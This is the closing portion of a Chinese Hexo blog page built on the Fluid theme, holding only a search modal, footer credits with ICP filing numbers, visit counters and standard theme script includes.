      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
    <!-- 备案信息 ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      浙ICP备2022002247号
    </a>
  </span>
  
    
      <span class="beian-police">
        
          <span style="visibility: hidden; width: 0">|</span>
          <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
        
        <span class="beian-police">浙公网安备33021202003790号</span>
      </span>
    
  
</div>

  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
